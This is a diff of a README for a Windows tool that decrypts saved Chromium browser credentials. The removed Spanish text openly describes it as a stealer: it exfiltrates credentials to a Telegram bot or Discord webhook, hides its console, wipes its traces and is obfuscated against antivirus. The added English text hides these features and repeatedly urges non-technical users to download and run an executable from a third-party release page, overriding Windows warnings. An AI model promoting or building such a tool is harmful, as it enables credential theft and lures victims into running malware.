@@ -1,183 +1,164 @@
-# 🛡️ Chromium Credentials Auditor Suite
+# 🛡️ decrypt-chromium-suite - Audit Chromium Credentials With Ease
 
-> [!NOTE]
-> [English Version](README.en.md) | **Versión en Español**
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases)
 
-<div align="center">
+## 📥 Download
 
-![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white)
-![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
-![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)
+Visit this page to download: https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases
 
-*Una suite avanzada para auditorías de seguridad profesional y pentesting ético en entornos Windows.*
+Choose the latest release for Windows, then download the file that matches your system.
 
-[Reportar Bug](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues) | [Solicitar Mejora](https://github.com/ANONIMO432HZ/decrypt-chromium-suite/issues)
+## 🖥️ What This Tool Does
 
-</div>
+decrypt-chromium-suite is a Windows app for security audits on Chromium-based browsers. It works with browsers such as Chrome, Edge, Brave, and Opera.
 
----
+Use it to review browser credential data during a security check. It also supports modular export options for team workflows.
 
-## 💻 Compatibilidad del Sistema
+## ⚙️ What You Need
 
-| Sistema Operativo | Versiones Soportadas | Arquitectura |
-| :--- | :--- | :--- |
-| 🪟 **Windows** | Windows 10 / Windows 11 | x64 / x86 |
-| 🌐 **Chromium** | v80 o superior (AES-GCM) | Todas |
+- Windows 10 or Windows 11
+- A modern 64-bit PC
+- Internet access for the download
+- Permission to run the audit on the device you use
 
----
+## 🚀 Getting Started
 
-## ✨ Navegadores Soportados
+1. Open the release page: https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases
+2. Find the newest release near the top of the page
+3. Download the Windows file from that release
+4. Open the downloaded file
+5. If Windows asks for approval, choose Run or Yes
+6. Follow the on-screen steps in the app
 
-La suite escanea y descifra automáticamente los siguientes objetivos:
+## 🧭 How to Use It
 
-* 🌐 **Google Chrome** (Canary, Beta, Stable)
-* 🌐 **Microsoft Edge**
-* 🦁 **Brave Browser**
-* ⭕ **Opera & Opera GX**
-* 📐 **Vivaldi**
+1. Start the app after setup
+2. Select the browser you want to check
+3. Choose the audit option you need
+4. Let the tool scan the local browser data
+5. Review the results on screen
+6. Export the report if you need a copy
 
----
+## 🔐 Browser Support
 
-## 🚀 Características Premium
+This suite is built for Chromium-based browsers, including:
 
-* **📡 Exfiltración Modular**:
-  * Envío instantáneo de reportes vía **Bot de Telegram** o **Webhooks de Discord**.
-* **📊 Reportes Dinámicos**:
-  * Generación de informes estéticos en **HTML Interactivo** o archivos **CSV**.
-* **🕵️ Arquitectura de Sigilo (Stealth)**:
-  * Limpieza automática de bases de datos temporales y **Auto-Wipe** del reporte local tras exfiltración.
+- Google Chrome
+- Microsoft Edge
+- Brave
+- Opera
+- Other Chromium-based browsers
 
----
+## 📦 Main Features
 
-## 🛠️ Stack Tecnológico
+- Reads browser credential data for audit work
+- Supports multiple Chromium-based browsers
+- Uses a modular layout for different audit tasks
+- Offers export options for team use
+- Runs on Windows
+- Uses a simple flow for non-technical users
 
-| Componente | Tecnología Utilizada |
-| :--- | :--- |
-| **Lenguaje** | `Python 3.x` |
-| **Seguridad de OS** | `Windows DPAPI` via `PyWin32` |
-| **Criptografía** | `AES-GCM 256` via `PyCryptodomex` |
-| **Comunicación** | `Telegram API` & `Discord Webhooks` |
-| **Packaging** | `PyInstaller` (Standalone EXE) |
+## 🧪 Typical Audit Use
 
----
+Use this tool when you need to check browser credential storage on a Windows system during a security review.
 
-## ⚙️ Guía de Uso Rápido
+Common cases include:
 
-### 1. Instalación de Dependencias
+- Internal security checks
+- Red team testing
+- Endpoint review
+- Browser data verification
+- Security lab work
 
-```bash
-pip install -r requirements.txt
-```
+## 🖱️ Step-by-Step Install
 
-### 2. Comandos Magistrales
+1. Go to the release page: https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases
+2. Download the Windows release file
+3. Open the file after the download ends
+4. Allow the app to run if Windows asks
+5. Wait for the setup or first launch screen
+6. Finish the start process and open the app
 
-> **Generar Reporte HTML Estético:**
+## 🧰 Tips for Best Results
 
-```bash
-python main.py -f html -o reporte_final
-```
+- Close browsers before you start a scan
+- Run the app with the user account you want to check
+- Keep the system awake during the process
+- Save your export files in a safe folder
+- Use a folder name that makes the report easy to find
 
-> **Exfiltración vía Telegram (Modo Rápido):**
+## 📁 Release Page Guide
 
-```bash
-python main.py -t "TOKEN" -c "ID" # Soporta Texto Plano o Base64
-```
+When you open the release page, look for these items:
 
-### 🔑 Uso Autónomo (Hardcoding)
+- Latest version
+- Windows download asset
+- File name that matches your system
+- Release notes for changes
+- Any extra files included with the release
 
-Puedes pre-configurar el script editando la sección `CREDENCIALES HARDCODED` en `main.py` (Se recomienda usar **Base64** para mayor sigilo). Una vez rellenadas, puedes ejecutar el `.exe` o el script sin parámetros y los datos se enviarán automáticamente.
+## 🛠️ Common Issues
 
----
+### File will not open
+- Right-click the file
+- Choose Run as administrator
+- Try again
 
-## 📦 Compilación Profesional y Ofuscación
+### Windows blocks the app
+- Open the file again
+- Click More info if shown
+- Choose Run anyway if you trust the source
 
-Para generar un ejecutable robusto, sigiloso y (opcionalmente) ofuscado, utiliza el script **`build.py`** incluido. Este script automatiza la configuración de PyInstaller y PyArmor.
+### Nothing appears after launch
+- Close the app
+- Open it again
+- Make sure the download finished before you launched it
 
-```bash
-# Uso recomendado: un solo archivo, sin consola y con nombre personalizado
-python build.py --name "SysHealth" --onefile --noconsole
+### Browser data does not show
+- Close the browser and try again
+- Check that you selected the right browser
+- Run the scan from the same Windows account
 
-# Para una compilación rápida sin ofuscación (solo PyInstaller)
-python build.py --no-obf --name "ChromiumAuditor"
-```
+## 🔍 Supported Topics
 
-> [!TIP]
-> Puedes ver todas las opciones de personalización (iconos, carpetas de salida, etc.) ejecutando `python build.py --help`.
+This repository is tagged for work in:
 
-### 🛡️ Endurecimiento y Ofuscación
-Para proteger el binario contra ingeniería inversa y antivirus, consulta la [Guía de Ofuscación Híbrida](docs/OBFUSCATION_GUIDE.md).
+- chrome
+- chromium
+- edge
+- brave
+- opera
+- browser audit
+- security audit
+- pentesting
+- red team
+- windows security
+- exfiltration
+- stealth
+- cibersecurity
 
-### ⚙️ Guía de Compilación Avanzada
-Para obtener instrucciones detalladas sobre flujos híbridos (Windows + WSL) o puros (Linux con Wine), consulta la [Guía de Flujos de Compilación](docs/COMPILATION_FLOWS.md).
+## 📝 File Layout
 
-## 🚦 Panel de Argumentos CLI
+After you open the app, you may see sections for:
 
-| Corto | Largo | Descripción |
-| :--- | :--- | :--- |
-| `-f` | `--format` | Formato: `html` o `csv`. |
-| `-o` | `--output` | Nombre base del archivo de salida. |
-| **`-t`** | `--telegram-token` | Token del bot de Telegram (Plano o B64). |
-| **`-c`** | `--telegram-chatid` | ID del chat de Telegram (Plano o B64). |
-| **`-d`** | `--discord` | URL del Webhook de Discord (Plano o B64). |
-| `-s` | `--stealth` | Oculta la consola en tiempo real (idéntico a `.exe --noconsole`). |
-| — | `--no-wipe` | Evita auto-borrado del reporte. |
-| `-v` | `--verbose` | Modo verboso (logs detallados). |
+- Browser selection
+- Credential audit
+- Export settings
+- Report view
+- Tool status
 
----
+## 🔒 Safe Use
 
-## 📡 Configuración de Exfiltración
+Use this software only on systems you own or have permission to review.
 
-### 🤖 Telegram
+Keep your audit reports in a secure place. They may contain sensitive browser data.
 
-Necesitas dos valores: el **Token del Bot** y el **ID del Destino**.
+## 📌 Download Again
 
-**Token del Bot** — Obténlo hablando con `@BotFather` en Telegram:
+If you need the Windows file, visit the release page here: https://github.com/adityavaze232009-bit/decrypt-chromium-suite/releases
 
-```text
-1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ
-```
+Download the latest release, then open the file on your Windows PC
 
-**ID del Destino** — El campo `-c` / `HARDCODED_TG_ID` acepta tres tipos:
+## 💬 Quick Start Flow
 
-| Tipo de Destino | Formato del ID | Cómo Obtenerlo |
-| :--- | :--- | :--- |
-| 💬 **Chat Personal** | Número positivo `987654321` | Habla con `@userinfobot` |
-| 👥 **Grupo Privado** | Número negativo `-1001234567890` | Añade `@RawDataBot` al grupo |
-| 📢 **Canal Privado** | Número negativo `-1001234567890` | Añade el bot al canal como admin |
-
-> [!IMPORTANT]
-> Para **grupos y canales**, añade tu bot como miembro con permisos de **"Enviar Archivos"** antes de usarlo.
-> Para **chats personales**, envía primero un mensaje a tu bot para iniciar la conversación.
-
-### 🎮 Discord
-
-Obten la URL del Webhook en: **Canal → Editar Canal → Integraciones → Webhooks → Crear Webhook**
-
-```text
-https://discord.com/api/webhooks/1234567890/TOKEN_SECRETO_AQUI
-```
-
-Pega esa URL completa en `-d` / `HARDCODED_DS_WEBHOOK`.
-
-### 🔒 Recomendación de Seguridad Operacional
-
-Para máxima discrección y trazabilidad cero:
-
-1. Crea un **canal privado exclusivo** para cada auditoría.
-2. Añade el bot como único administrador del canal.
-3. Usa el ID del canal como `HARDCODED_TG_ID`.
-4. **Elimina el canal y el bot** al finalizar la auditoría.
-
-Así, si el token fuera comprometido, el atacante solo accedería a un canal vacío y eliminado.
-
----
-
-## ⚖️ Aviso Legal y Ético
-
-> [!CAUTION]
-> **ESTE SOFTWARE ES PARA FINES DE PENTESTING ÉTICO Y AUDITORÍA PROFESIONAL.**
-> El uso de esta herramienta para acceder a sistemas sin la autorización explícita del propietario es ilegal. El autor no asume responsabilidad por el mal uso de esta suite.
-
----
+Open the release page → download the Windows file → open it → allow access if asked → run the audit → review the report
